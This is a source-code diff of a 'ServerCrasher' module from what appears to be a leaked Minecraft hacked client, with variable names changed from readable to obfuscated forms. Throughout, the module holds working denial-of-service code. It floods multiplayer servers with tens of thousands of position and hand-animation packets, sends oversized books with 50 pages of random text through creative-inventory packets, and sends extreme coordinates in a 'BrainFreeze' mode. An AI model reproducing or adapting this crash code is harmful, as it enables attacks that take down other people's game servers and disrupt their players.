@@ -18,7 +18,7 @@ import net.minecraft.network.play.client.CPlayerPacket;
 import net.minecraft.util.Hand;
 
 public class ServerCrasher extends PremiumModule {
-    private int tickCount;
+    private int field23695;
 
     public ServerCrasher() {
         super(ModuleCategory.WORLD, "ServerCrasher", "Crashes a server");
@@ -27,67 +27,72 @@ public class ServerCrasher extends PremiumModule {
 
     @Override
     public void onEnable() {
-        this.tickCount = 0;
+        this.field23695 = 0;
     }
 
     @EventTarget
-    private void onTick(TickEvent event) {
+    private void method16482(TickEvent var1) {
         if (this.isEnabled()) {
             if (mc.isSingleplayer()) {
                 this.toggle();
             } else {
-                String mode = this.getStringSettingValueByName("Mode");
-                switch (mode) {
+                String var4 = this.getStringSettingValueByName("Mode");
+                switch (var4) {
                     case "Flying Enabled":
-                        double posX = mc.player.getPosX();
-                        double posY = mc.player.getPosY();
-                        double posZ = mc.player.getPosZ();
+                        double var6 = mc.player.getPosX();
+                        double var8 = mc.player.getPosY();
+                        double var10 = mc.player.getPosZ();
+                        double var12 = 0.0;
+                        double var14 = 0.0;
 
-                        for (int i = 0; i < 50000; i++) {
-                            double offset = i * 7;
-                            mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(posX - offset, posY, posZ + offset, false));
+                        for (int var26 = 0; var26 < 50000; var26++) {
+                            var14 = var26 * 7;
+                            mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(var6 - var14, var8 + var12, var10 + var14, false));
                         }
+
                         Class8906.method32487("Trying to crash the server..");
                         this.toggle();
                         break;
                     case "Vanilla":
-                        if (this.tickCount++ >= 10) {
-                            this.tickCount = 0;
-                            for (int i = 0; i < 100000; i++) {
+                        if (this.field23695++ >= 10) {
+                            this.field23695 = 0;
+
+                            for (int var25 = 0; var25 < 100000; var25++) {
                                 mc.getConnection().sendPacket(new CAnimateHandPacket(Hand.MAIN_HAND));
                             }
+
                             Class8906.method32487("Trying to crash the server..");
                         }
                         break;
                     case "Book":
-                        ItemStack bookItem = new ItemStack(Items.field38047); // field38047 is Book - Away
-                        ListNBT pagesList = new ListNBT();
-                        CompoundNBT bookTag = new CompoundNBT();
-                        StringBuilder pageContent = new StringBuilder();
+                        ItemStack var16 = new ItemStack(Items.field38047);
+                        ListNBT var17 = new ListNBT();
+                        CompoundNBT var18 = new CompoundNBT();
+                        String var19 = "";
 
-                        for (int i = 0; i < 5000; i++) {
-                            char randomChar = (char) Math.round(32.0 + Math.random() * 94.0);
-                            pageContent.append(randomChar);
+                        for (int var20 = 0; var20 < 5000; var20++) {
+                            char var21 = (char) Math.round(32.0F + (float) Math.random() * 94.0F);
+                            var19 = var19 + var21;
                         }
 
-                        for (int i = 0; i < 50; i++) {
-                            StringNBT page = new StringNBT(pageContent.toString());
-                            pagesList.add(page);
+                        for (int var27 = 0; var27 < 50; var27++) {
+                            StringNBT var22 = new StringNBT(var19);
+                            var17.add(var22);
                         }
 
-                        bookTag.putString("author", "LeakedPvP");
-                        bookTag.putString("title", "Sigma");
-                        bookTag.put("pages", pagesList);
-                        bookItem.setTagInfo("pages", pagesList);
-                        bookItem.setTag(bookTag);
+                        var18.putString("author", "LeakedPvP");
+                        var18.putString("title", "Sigma");
+                        var18.put("pages", var17);
+                        var16.setTagInfo("pages", var17);
+                        var16.setTag(var18);
 
-                        for (int i = 0; i < 100; i++) {
+                        for (int var28 = 0; var28 < 100; var28++) {
                             try {
-                                mc.getConnection().sendPacket(new CCreativeInventoryActionPacket(0, bookItem));
-                            } catch (Exception e) {
-                                // Handle exception if necessary
+                                mc.getConnection().sendPacket(new CCreativeInventoryActionPacket(0, var16));
+                            } catch (Exception var23) {
                             }
                         }
+
                         this.toggle();
                         break;
                     case "Infinity":
@@ -96,9 +101,25 @@ public class ServerCrasher extends PremiumModule {
                         this.toggle();
                         break;
                     case "BrainFreeze":
-                        mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(mc.player.getPosX() + 9999.0, mc.player.getPosY() + 9999.0, mc.player.getPosZ() + 9999.0, false));
-                        mc.getConnection().sendPacket(new CPlayerPacket.PositionPacket(mc.player.getPosX(), mc.player.getBoundingBox().minY, mc.player.getPosZ() + 9999.0, mc.player.onGround));
-                        if (this.tickCount++ >= 200) {
+                        mc.getConnection()
+                                .sendPacket(
+                                        new CPlayerPacket.PositionPacket(
+                                                mc.player.getPosX() + 9999.0,
+                                                mc.player.getPosY() + 9999.0,
+                                                mc.player.getPosZ() + 9999.0,
+                                                false
+                                        )
+                                );
+                        mc.getConnection()
+                                .sendPacket(
+                                        new CPlayerPacket.PositionPacket(
+                                                mc.player.getPosX(),
+                                                mc.player.getBoundingBox().minY,
+                                                mc.player.getPosZ() + 9999.0,
+                                                mc.player.onGround
+                                        )
+                                );
+                        if (this.field23695++ >= 200) {
                             this.toggle();
                             Class8906.method32487("Trying to crash the server..");
                         }
